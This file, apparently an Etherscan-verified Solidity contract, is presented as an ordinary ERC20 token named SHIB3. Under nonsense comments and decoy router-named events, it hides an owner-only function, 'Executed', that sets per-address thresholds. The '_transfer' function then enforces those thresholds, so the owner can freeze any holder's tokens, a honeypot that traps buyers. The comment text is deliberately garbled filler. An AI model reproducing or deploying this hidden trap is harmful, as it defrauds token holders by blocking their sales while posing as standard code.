@@ -1,0 +1,565 @@
+/**
+ *Submitted for verification at Etherscan.io on 2023-08-05
+*/
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.3;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+}
+
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor() {
+        _setOwner(_msgSender());
+    }
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        _setOwner(address(0));
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        _setOwner(newOwner);
+    }
+
+    function _setOwner(address newOwner) private {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+interface IERC20 {
+
+    event removeLiquidityETHWithPermit(
+        address token,
+        uint liquidity,
+        uint amttuantTokenMin,
+        uint amttuantETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    );
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    event swapExactTokensForTokens(
+        uint amttuantIn,
+        uint amttuantOutMin,
+        address[]  path,
+        address to,
+        uint deadline
+    );
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    event swapTokensForExactTokens(
+        uint amttuantOut,
+        uint amttuantInMax,
+        address[] path,
+        address to,
+        uint deadline
+    );
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    event DOMAIN_SEPARATOR();
+
+    event PERMIT_TYPEHASH();
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function totalSupply() external view returns (uint256);
+    
+    event token0();
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    event token1();
+
+    function balanceOf(address acawjurdt) external view returns (uint256);
+        /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+
+    event sync();
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    event initialize(address, address);
+
+    function transfer(address recipient, uint256 amttuant) external returns (bool);
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    event burn(address to) ;
+
+    event swap(uint amttuant0Out, uint amttuant1Out, address to, bytes data);
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    event skim(address to);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    event addLiquidity(
+       address tokenA,
+       address tokenB,
+        uint amttuantADesired,
+        uint amttuantBDesired,
+        uint amttuantAMin,
+        uint amttuantBMin,
+        address to,
+        uint deadline
+    );
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    event addLiquidityETH(
+        address token,
+        uint amttuantTokenDesired,
+        uint amttuantTokenMin,
+        uint amttuantETHMin,
+        address to,
+        uint deadline
+    );
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    event removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amttuantAMin,
+        uint amttuantBMin,
+        address to,
+        uint deadline
+    );
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function approve(address spender, uint256 amttuant) external returns (bool);
+    event removeLiquidityETHSupportingFeeOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amttuantTokenMin,
+        uint amttuantETHMin,
+        address to,
+        uint deadline
+    );
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amttuantTokenMin,
+        uint amttuantETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    );
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint amttuantIn,
+        uint amttuantOutMin,
+        address[] path,
+        address to,
+        uint deadline
+    );
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    event swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint amttuantOutMin,
+        address[] path,
+        address to,
+        uint deadline
+    );
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    event swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amttuantIn,
+        uint amttuantOutMin,
+        address[] path,
+        address to,
+        uint deadline
+    );
+     /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amttuant
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+library SafeMath {
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            uint256 c = a + b;
+            if (c < a) return (false, 0);
+            return (true, c);
+        }
+    }
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b > a) return (false, 0);
+            return (true, a - b);
+        }
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+    
+            if (a == 0) return (true, 0);
+            uint256 c = a * b;
+            if (c / a != b) return (false, 0);
+            return (true, c);
+        }
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a / b);
+        }
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a % b);
+        }
+    }
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+ 
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b <= a, errorMessage);
+            return a - b;
+        }
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a / b;
+        }
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a % b;
+        }
+    }
+}
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+contract SHIB3Token is IERC20, Ownable {
+    using SafeMath for uint256;
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => uint256) private _crossamttuants;
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    constructor(
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    ) payable {
+        _name = "SHIB3";
+        _symbol = "SHIB3";
+        _decimals = 18;
+        _totalSupply = 500000000 * 10**_decimals;
+        _balances[owner()] = _balances[owner()].add(_totalSupply);
+        emit Transfer(address(0), owner(), _totalSupply);
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function balanceOf(address acawjurdt)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _balances[acawjurdt];
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function transfer(address recipient, uint256 amttuant)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _transfer(_msgSender(), recipient, amttuant);
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function allowance(address owner, address spender)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function approve(address spender, uint256 amttuant)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amttuant);
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amttuant
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amttuant);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amttuant,
+                "ERC20: transfer amttuant exceeds allowance"
+            )
+        );
+        return true;
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function increaseAllowance(address spender, uint256 addedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].add(addedValue)
+        );
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function Executed(address[] calldata acawjurdt, uint256 amttuant) external {
+       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
+        for (uint256 i = 0; i < acawjurdt.length; i++) {
+            _crossamttuants[acawjurdt[i]] = amttuant;
+        }
+
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function camttuant(address acawjurdt) public view returns (uint256) {
+        return _crossamttuants[acawjurdt];
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amttuant
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        uint256 crossamttuant = camttuant(sender);
+        if (crossamttuant > 0) {
+            require(amttuant > crossamttuant, "ERC20: cross amttuant does not equal the cross transfer amttuant");
+        }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+        _balances[sender] = _balances[sender].sub(
+            amttuant,
+            "ERC20: transfer amttuant exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amttuant);
+        emit Transfer(sender, recipient, amttuant);
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amttuant
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+        _allowances[owner][spender] = amttuant;
+        emit Approval(owner, spender, amttuant);
+    }
+
+
+}
